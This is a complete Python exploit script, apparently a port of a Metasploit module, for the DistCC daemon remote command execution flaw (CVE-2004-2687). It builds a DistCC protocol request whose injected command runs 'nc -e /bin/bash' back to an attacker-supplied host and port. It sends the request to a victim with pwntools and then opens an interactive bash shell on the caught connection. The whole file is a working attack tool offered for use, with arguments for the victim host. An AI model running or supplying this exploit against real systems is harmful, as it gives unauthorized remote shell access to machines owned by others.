# -*- coding: utf-8 -*-

# DistCC Daemon Command Execution
# CVE: 2004-2687
# Exploit author: HD Moore "hdm"
# https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import random
import string
import sys
from pwn import *

# https://pynative.com/python-generate-random-string/
def randomString(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))
    
def main():
    
    # args
    argparser = argparse.ArgumentParser(description='DistCC Daemon Command Execution', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='Victim host', 
                            required=True)
    
    main_arg.add_argument('--rport', type=int,
                            help='Victim port (default: 3632)', 
                            default=3632)
    
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    rhost = args.rhost
    rport = args.rport
    lhost = args.lhost
    lport = args.lport
    
    if len(lport) != 4:
        print(" [*] Please, specify ports with 4 digits lenght!")
        sys.exit(1)
    
    def reverse_shell():
        
        l = listen(lport)
        l.sendline(""" python -c 'import pty; pty.spawn("/bin/bash")'""")
        l.interactive()
    
    # https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/misc/distcc_exec.rb
    def exploit(): 
        
        print(" [*] Crafting the exploit payload...")
        
        try:
            magic_padding = "A" * (10 + ((len(lhost) - 10) * -1)) 
            rev_shell = "echo AA;echo AAAA;echo {};echo AAAAAAAAAA;echo AAAAAAAAAA;echo AAAAAAA;nc -e /bin/bash {} {}".format(magic_padding, lhost, lport)
            rces = ["sh", "-c", "'({})'".format(rev_shell)]
            payload = "DIST00000001"
            payload += "ARGC00000008"
            
            for index, rce in enumerate(rces):
                if index == 2:
                    full_rce = ""
                    for index_, rce_ in enumerate(rces):
                        full_rce += "{} ".format(rce_)
                    else:
                        full_rce = full_rce[:-1]
                            
                    payload += "ARGV{}{}{}".format("0" * 6, hex(len(full_rce))[2:], full_rce)
                else:
                    payload += "ARGV{}{}{}".format("0" * 7, len(rce), rce)
            
            payload += "ARGV00000001#"
            payload += "ARGV00000002-cARGV00000006main.cARGV00000002-oARGV00000006main.o"
        
        except Exception as e:
            print(e)
            print(" [*] Failed to craft the payload!")
            sys.exit(1)
        
        else:
            print(" [*] Exploiting the DistCC Daemon...")
            
            try:
                r = remote(rhost, rport)
                r.send(payload)
                r.send("DOTI0000000A#{}\n".format(randomString()))
            
            except Exception as e:
                print(e)
                print(" [*] Failed to exploit! :(")
                sys.exit(1)
            
            else:
                print(" [*] DistCC Daemon exploited with success!")
                print(" [*] Spawning the reverse shell...")
                reverse_shell()
    
    # main
    print(" [>] DistCC Daemon Command Execution")
    print(" [*] Python script exploit author: nullarmor")
    exploit()
        

if __name__ == "__main__":
    main()
